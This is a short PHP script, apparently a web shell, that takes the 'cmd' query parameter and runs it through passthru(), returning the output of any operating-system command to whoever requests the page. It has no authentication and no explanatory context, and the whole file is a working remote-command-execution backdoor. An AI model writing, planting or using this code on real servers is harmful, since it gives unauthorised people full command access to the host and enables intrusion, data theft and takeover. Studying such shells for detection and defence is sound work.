<?php
    if (isset($_GET["cmd"])) {
        $command_string = $_GET["cmd"];

        try {
            passthru($command_string);
        } catch (Error $error) {
            echo "<p class=mt-3><b>$error</b></p>";
        }
    }
?>
